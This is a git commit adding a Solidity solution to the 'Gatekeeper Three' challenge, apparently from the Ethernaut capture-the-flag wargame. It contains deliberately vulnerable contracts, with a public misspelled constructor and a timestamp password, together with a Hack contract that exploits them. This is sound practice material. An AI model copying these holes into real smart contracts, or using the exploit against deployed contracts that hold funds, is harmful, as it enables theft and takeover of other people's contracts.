24b1dc7cf44f330a6fa9ffca4e3b39dffef0fc76
MacKozuszek <mackozuszek@gmail.com>
2023-09-10 11:25:01 +0200

    Gatekeeper three

---
+++ contracts/GatekeeperThree.sol
@@ -0,0 +1,100 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SimpleTrick {
+  GatekeeperThree public target;
+  address public trick;
+  uint private password = block.timestamp;
+
+  constructor (address payable _target) {
+    target = GatekeeperThree(_target);
+  }
+    
+  function checkPassword(uint _password) public returns (bool) {
+    if (_password == password) {
+      return true;
+    }
+    password = block.timestamp;
+    return false;
+  }
+    
+  function trickInit() public {
+    trick = address(this);
+  }
+    
+  function trickyTrick() public {
+    if (address(this) == msg.sender && address(this) != trick) {
+      target.getAllowance(password);
+    }
+  }
+}
+
+contract GatekeeperThree {
+  address public owner;
+  address public entrant;
+  bool public allowEntrance;
+
+  SimpleTrick public trick;
+
+  function construct0r() public {
+      owner = msg.sender;
+  }
+
+  modifier gateOne() {
+    require(msg.sender == owner);
+    require(tx.origin != owner);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(allowEntrance == true);
+    _;
+  }
+
+  modifier gateThree() {
+    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+      _;
+    }
+  }
+
+  function getAllowance(uint _password) public {
+    if (trick.checkPassword(_password)) {
+        allowEntrance = true;
+    }
+  }
+
+  function createTrick() public {
+    trick = new SimpleTrick(payable(address(this)));
+    trick.trickInit();
+  }
+
+  function enter() public gateOne gateTwo gateThree {
+    entrant = tx.origin;
+  }
+
+  receive () external payable {}
+}
+
+contract Hack {
+  
+  GatekeeperThree target;
+
+  constructor(address payable _target) payable {
+    target = GatekeeperThree(_target);
+  }
+
+  function hack() public payable {
+    target.construct0r();
+    target.createTrick();
+    target.getAllowance(block.timestamp);
+    require(target.allowEntrance());
+    uint amount = 0.001 ether + 1 wei;
+    address(target).call{value: amount}("");
+    target.enter();
+    require(target.entrant() == msg.sender);
+  }
+
+  receive() external payable {
+    revert();
+  }
+}
